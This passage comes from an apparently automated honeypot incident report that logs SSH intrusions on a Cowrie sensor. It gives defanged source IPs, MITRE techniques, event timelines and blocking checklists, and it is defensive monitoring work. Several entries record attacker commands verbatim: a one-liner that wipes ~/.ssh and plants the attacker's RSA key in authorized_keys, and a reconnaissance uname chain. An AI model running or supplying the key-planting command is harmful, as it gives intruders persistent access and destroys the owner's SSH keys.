| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 17:08:38` | `cowrie.session.connect` |
| `2026-07-02 17:08:38` | `cowrie.client.version` |
| `2026-07-02 17:08:38` | `cowrie.client.kex` |
| `2026-07-02 17:08:39` | `cowrie.login.success` |
| `2026-07-02 17:08:40` | `cowrie.session.params` |
| `2026-07-02 17:08:40` | `cowrie.command.input` |
| `2026-07-02 17:08:40` | `cowrie.command.input` |
| `2026-07-02 17:08:40` | `cowrie.command.input` |
| `2026-07-02 17:08:40` | `cowrie.command.input` |
| `2026-07-02 17:08:40` | `cowrie.command.input` |
| `2026-07-02 17:08:40` | `cowrie.command.success` |
| `2026-07-02 17:08:40` | `cowrie.command.input` |
| `2026-07-02 17:08:40` | `cowrie.command.input` |
| `2026-07-02 17:08:40` | `cowrie.command.input` |
| `2026-07-02 17:08:40` | `cowrie.command.input` |
| `2026-07-02 17:08:40` | `cowrie.log.closed` |
| `2026-07-02 17:08:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-81404e99c02b

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-07-02 17:09 |
| **Last Seen** | 2026-07-02 17:09 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 17:09:50` | `cowrie.session.connect` |
| `2026-07-02 17:09:50` | `cowrie.client.version` |
| `2026-07-02 17:09:50` | `cowrie.client.kex` |
| `2026-07-02 17:09:51` | `cowrie.login.success` |
| `2026-07-02 17:09:53` | `cowrie.session.params` |
| `2026-07-02 17:09:53` | `cowrie.command.input` |
| `2026-07-02 17:09:53` | `cowrie.log.closed` |
| `2026-07-02 17:09:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-09a6a8ac32a5

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-02 17:11 |
| **Last Seen** | 2026-07-02 17:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 17:11:42` | `cowrie.session.connect` |
| `2026-07-02 17:11:42` | `cowrie.client.version` |
| `2026-07-02 17:11:42` | `cowrie.client.kex` |
| `2026-07-02 17:11:42` | `cowrie.login.success` |
| `2026-07-02 17:11:43` | `cowrie.session.params` |
| `2026-07-02 17:11:43` | `cowrie.command.input` |
| `2026-07-02 17:11:43` | `cowrie.command.input` |
| `2026-07-02 17:11:43` | `cowrie.command.input` |
| `2026-07-02 17:11:43` | `cowrie.command.input` |
| `2026-07-02 17:11:43` | `cowrie.command.input` |
| `2026-07-02 17:11:43` | `cowrie.command.success` |
| `2026-07-02 17:11:43` | `cowrie.command.input` |
| `2026-07-02 17:11:43` | `cowrie.command.input` |
| `2026-07-02 17:11:43` | `cowrie.command.input` |
| `2026-07-02 17:11:43` | `cowrie.command.input` |
| `2026-07-02 17:11:43` | `cowrie.log.closed` |
| `2026-07-02 17:11:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e504325cd2ee

| Field | Detail |
|---|---|
| **Source IP** | `103.176.20[.]115` |
| **First Seen** | 2026-07-02 17:13 |
| **Last Seen** | 2026-07-02 17:13 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 17:13:03` | `cowrie.session.connect` |
| `2026-07-02 17:13:03` | `cowrie.client.version` |
| `2026-07-02 17:13:03` | `cowrie.client.kex` |
| `2026-07-02 17:13:04` | `cowrie.login.success` |
| `2026-07-02 17:13:05` | `cowrie.session.params` |
| `2026-07-02 17:13:05` | `cowrie.command.input` |
| `2026-07-02 17:13:05` | `cowrie.command.failed` |
| `2026-07-02 17:13:06` | `cowrie.log.closed` |
| `2026-07-02 17:13:07` | `cowrie.session.params` |
| `2026-07-02 17:13:07` | `cowrie.command.input` |
| `2026-07-02 17:13:07` | `cowrie.session.file_download` |
| `2026-07-02 17:13:07` | `cowrie.log.closed` |
| `2026-07-02 17:13:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.176.20[.]115` to AbuseIPDB if not already reported
- [ ] Block `103.176.20[.]115` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-50fee3e088ee

| Field | Detail |
|---|---|
| **Source IP** | `103.176.20[.]115` |
| **First Seen** | 2026-07-02 17:13 |
| **Last Seen** | 2026-07-02 17:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 17:13:07` | `cowrie.session.connect` |
| `2026-07-02 17:13:07` | `cowrie.client.version` |
| `2026-07-02 17:13:07` | `cowrie.client.kex` |
| `2026-07-02 17:13:08` | `cowrie.login.success` |
| `2026-07-02 17:13:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.176.20[.]115` to AbuseIPDB if not already reported
- [ ] Block `103.176.20[.]115` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f0cb014f9699

| Field | Detail |
|---|---|
| **Source IP** | `103.176.20[.]115` |
| **First Seen** | 2026-07-02 17:13 |
| **Last Seen** | 2026-07-02 17:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 17:13:09` | `cowrie.session.connect` |
| `2026-07-02 17:13:09` | `cowrie.client.version` |
| `2026-07-02 17:13:09` | `cowrie.client.kex` |
| `2026-07-02 17:13:10` | `cowrie.login.success` |
| `2026-07-02 17:13:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.176.20[.]115` to AbuseIPDB if not already reported
- [ ] Block `103.176.20[.]115` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bcf1d0ac5e39

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-02 17:13 |
| **Last Seen** | 2026-07-02 17:13 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 17:13:23` | `cowrie.session.connect` |
| `2026-07-02 17:13:26` | `cowrie.client.version` |
| `2026-07-02 17:13:26` | `cowrie.client.kex` |
| `2026-07-02 17:13:31` | `cowrie.login.success` |
| `2026-07-02 17:13:36` | `cowrie.session.params` |
| `2026-07-02 17:13:36` | `cowrie.command.input` |
| `2026-07-02 17:13:37` | `cowrie.log.closed` |
| `2026-07-02 17:13:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e7428fe7d5a0

| Field | Detail |
|---|---|
| **Source IP** | `165.154.200[.]48` |
| **First Seen** | 2026-07-02 17:14 |
| **Last Seen** | 2026-07-02 17:14 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 17:14:12` | `cowrie.session.connect` |
| `2026-07-02 17:14:12` | `cowrie.client.version` |
| `2026-07-02 17:14:12` | `cowrie.client.kex` |
| `2026-07-02 17:14:13` | `cowrie.login.success` |
| `2026-07-02 17:14:14` | `cowrie.session.params` |
| `2026-07-02 17:14:14` | `cowrie.command.input` |
| `2026-07-02 17:14:14` | `cowrie.command.failed` |
| `2026-07-02 17:14:14` | `cowrie.log.closed` |
| `2026-07-02 17:14:15` | `cowrie.session.params` |
| `2026-07-02 17:14:15` | `cowrie.command.input` |
| `2026-07-02 17:14:16` | `cowrie.session.file_download` |
| `2026-07-02 17:14:16` | `cowrie.log.closed` |
| `2026-07-02 17:14:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.200[.]48` to AbuseIPDB if not already reported
- [ ] Block `165.154.200[.]48` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b0714a57a281

| Field | Detail |
|---|---|
| **Source IP** | `165.154.200[.]48` |
| **First Seen** | 2026-07-02 17:14 |
| **Last Seen** | 2026-07-02 17:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 17:14:16` | `cowrie.session.connect` |
| `2026-07-02 17:14:16` | `cowrie.client.version` |
| `2026-07-02 17:14:16` | `cowrie.client.kex` |
| `2026-07-02 17:14:17` | `cowrie.login.success` |
| `2026-07-02 17:14:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.200[.]48` to AbuseIPDB if not already reported
- [ ] Block `165.154.200[.]48` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b9c8557083e8

| Field | Detail |
|---|---|
| **Source IP** | `165.154.200[.]48` |
| **First Seen** | 2026-07-02 17:14 |
| **Last Seen** | 2026-07-02 17:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 17:14:18` | `cowrie.session.connect` |
| `2026-07-02 17:14:18` | `cowrie.client.version` |
| `2026-07-02 17:14:18` | `cowrie.client.kex` |
| `2026-07-02 17:14:19` | `cowrie.login.success` |
| `2026-07-02 17:14:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.200[.]48` to AbuseIPDB if not already reported
- [ ] Block `165.154.200[.]48` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6b6ba7516ea1

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-02 17:15 |
| **Last Seen** | 2026-07-02 17:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 17:15:10` | `cowrie.session.connect` |
| `2026-07-02 17:15:10` | `cowrie.client.version` |
| `2026-07-02 17:15:10` | `cowrie.client.kex` |
| `2026-07-02 17:15:10` | `cowrie.login.success` |
| `2026-07-02 17:15:11` | `cowrie.session.params` |
| `2026-07-02 17:15:11` | `cowrie.command.input` |
| `2026-07-02 17:15:11` | `cowrie.command.input` |
| `2026-07-02 17:15:11` | `cowrie.command.input` |
| `2026-07-02 17:15:11` | `cowrie.command.input` |
| `2026-07-02 17:15:11` | `cowrie.command.input` |
| `2026-07-02 17:15:11` | `cowrie.command.success` |
| `2026-07-02 17:15:11` | `cowrie.command.input` |
| `2026-07-02 17:15:11` | `cowrie.command.input` |
| `2026-07-02 17:15:11` | `cowrie.command.input` |
| `2026-07-02 17:15:11` | `cowrie.command.input` |
| `2026-07-02 17:15:11` | `cowrie.log.closed` |
| `2026-07-02 17:15:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a269822e785e

| Field | Detail |
|---|---|
| **Source IP** | `41.242.115[.]83` |
| **First Seen** | 2026-07-02 17:16 |
| **Last Seen** | 2026-07-02 17:16 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 17:16:25` | `cowrie.session.connect` |
| `2026-07-02 17:16:25` | `cowrie.client.version` |
| `2026-07-02 17:16:25` | `cowrie.client.kex` |
| `2026-07-02 17:16:26` | `cowrie.login.success` |
| `2026-07-02 17:16:27` | `cowrie.session.params` |
| `2026-07-02 17:16:27` | `cowrie.command.input` |
| `2026-07-02 17:16:27` | `cowrie.command.failed` |
| `2026-07-02 17:16:27` | `cowrie.log.closed` |
| `2026-07-02 17:16:28` | `cowrie.session.params` |
| `2026-07-02 17:16:28` | `cowrie.command.input` |
| `2026-07-02 17:16:28` | `cowrie.session.file_download` |
| `2026-07-02 17:16:28` | `cowrie.log.closed` |
| `2026-07-02 17:16:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.242.115[.]83` to AbuseIPDB if not already reported
- [ ] Block `41.242.115[.]83` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a11eba3b3632

| Field | Detail |
|---|---|
| **Source IP** | `41.242.115[.]83` |
| **First Seen** | 2026-07-02 17:16 |
| **Last Seen** | 2026-07-02 17:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 17:16:29` | `cowrie.session.connect` |
| `2026-07-02 17:16:29` | `cowrie.client.version` |
| `2026-07-02 17:16:29` | `cowrie.client.kex` |
| `2026-07-02 17:16:30` | `cowrie.login.success` |
| `2026-07-02 17:16:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.242.115[.]83` to AbuseIPDB if not already reported
- [ ] Block `41.242.115[.]83` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a6d1526e5a18

| Field | Detail |
|---|---|
| **Source IP** | `41.242.115[.]83` |
| **First Seen** | 2026-07-02 17:16 |
| **Last Seen** | 2026-07-02 17:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 17:16:30` | `cowrie.session.connect` |
| `2026-07-02 17:16:30` | `cowrie.client.version` |
| `2026-07-02 17:16:30` | `cowrie.client.kex` |
| `2026-07-02 17:16:31` | `cowrie.login.success` |
| `2026-07-02 17:16:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.242.115[.]83` to AbuseIPDB if not already reported
- [ ] Block `41.242.115[.]83` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5fb66b7db4b3

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-02 17:19 |
| **Last Seen** | 2026-07-02 17:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 17:19:15` | `cowrie.session.connect` |
| `2026-07-02 17:19:15` | `cowrie.client.version` |
| `2026-07-02 17:19:15` | `cowrie.client.kex` |
| `2026-07-02 17:19:15` | `cowrie.login.success` |
| `2026-07-02 17:19:16` | `cowrie.session.params` |
| `2026-07-02 17:19:16` | `cowrie.command.input` |
| `2026-07-02 17:19:16` | `cowrie.command.input` |
| `2026-07-02 17:19:16` | `cowrie.command.input` |
| `2026-07-02 17:19:16` | `cowrie.command.input` |
| `2026-07-02 17:19:16` | `cowrie.command.input` |
| `2026-07-02 17:19:16` | `cowrie.command.success` |
| `2026-07-02 17:19:16` | `cowrie.command.input` |
| `2026-07-02 17:19:16` | `cowrie.command.input` |
| `2026-07-02 17:19:16` | `cowrie.command.input` |
| `2026-07-02 17:19:16` | `cowrie.command.input` |
| `2026-07-02 17:19:16` | `cowrie.log.closed` |
| `2026-07-02 17:19:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1300f36e1920

| Field | Detail |
|---|---|
| **Source IP** | `209.141.47[.]217` |
| **First Seen** | 2026-07-02 17:20 |
| **Last Seen** | 2026-07-02 17:20 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 17:20:29` | `cowrie.session.connect` |
| `2026-07-02 17:20:29` | `cowrie.client.version` |
| `2026-07-02 17:20:29` | `cowrie.client.kex` |
| `2026-07-02 17:20:29` | `cowrie.login.success` |
| `2026-07-02 17:20:30` | `cowrie.session.params` |
| `2026-07-02 17:20:30` | `cowrie.command.input` |
| `2026-07-02 17:20:30` | `cowrie.command.failed` |
| `2026-07-02 17:20:30` | `cowrie.log.closed` |
| `2026-07-02 17:20:31` | `cowrie.session.params` |
| `2026-07-02 17:20:31` | `cowrie.command.input` |
| `2026-07-02 17:20:31` | `cowrie.session.file_download` |
| `2026-07-02 17:20:31` | `cowrie.log.closed` |
| `2026-07-02 17:20:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.141.47[.]217` to AbuseIPDB if not already reported
- [ ] Block `209.141.47[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0edc2e6696dd

| Field | Detail |
|---|---|
| **Source IP** | `209.141.47[.]217` |
| **First Seen** | 2026-07-02 17:20 |
| **Last Seen** | 2026-07-02 17:20 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 17:20:31` | `cowrie.session.connect` |
| `2026-07-02 17:20:31` | `cowrie.client.version` |
| `2026-07-02 17:20:31` | `cowrie.client.kex` |
| `2026-07-02 17:20:31` | `cowrie.login.success` |
| `2026-07-02 17:20:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.141.47[.]217` to AbuseIPDB if not already reported
- [ ] Block `209.141.47[.]217` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f1fc0b4e6cba

| Field | Detail |
|---|---|
| **Source IP** | `209.141.47[.]217` |
| **First Seen** | 2026-07-02 17:20 |
| **Last Seen** | 2026-07-02 17:20 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 17:20:31` | `cowrie.session.connect` |
| `2026-07-02 17:20:31` | `cowrie.client.version` |
| `2026-07-02 17:20:31` | `cowrie.client.kex` |
| `2026-07-02 17:20:32` | `cowrie.login.success` |
| `2026-07-02 17:20:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.141.47[.]217` to AbuseIPDB if not already reported
- [ ] Block `209.141.47[.]217` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-17373041d272

| Field | Detail |
|---|---|
| **Source IP** | `220.127.148[.]6` |
| **First Seen** | 2026-07-02 17:21 |
| **Last Seen** | 2026-07-02 17:21 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
